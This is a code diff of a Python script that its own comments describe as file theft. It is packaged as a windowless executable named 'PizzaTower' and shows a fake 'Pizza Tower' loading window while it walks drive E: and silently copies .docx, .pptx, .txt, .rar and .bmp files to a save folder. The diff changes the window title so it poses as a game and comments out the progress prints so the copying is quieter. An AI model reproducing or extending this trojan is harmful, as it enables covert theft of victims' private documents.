@@ -1,5 +1,5 @@
-# 文件窃取
-# pyinstaller -F -w -i .\1.png .\1.py -n PizzaTower
+# 窃取目标盘符指定类型文件
+# 打包：pyinstaller -F -w -i .\1.png .\1.py -n PizzaTower
 import os
 from win32 import *
 from win32api import GetLogicalDriveStrings
@@ -26,7 +26,7 @@ def simulate_loading():
             return
 
 root = tk.Tk()
-root.title("正在加载")
+root.title("Pizza Tower")
 root.resizable(False, False)
 # root.iconbitmap("1.ico")    # 设置图标
 
@@ -70,9 +70,9 @@ count = 0
 for root,ds,fs in os.walk("E:\\"):
     for files in fs:
         if files.lower().endswith((".docx",".bmp",".pptx",".rar",".txt")):
-            file_path = root + "\\" + files
-            save_path = path + files
+            file_path = root + "\\" + files    # 目标文件路径
+            save_path = path + files    # 保存路径
             CopyFile(file_path, save_path ,False)
-            count += 1
-            print(file_path)
-print(f"已复制{count}个文件")
+#             count += 1
+#             print(file_path)
+# print(f"已复制{count}个文件")
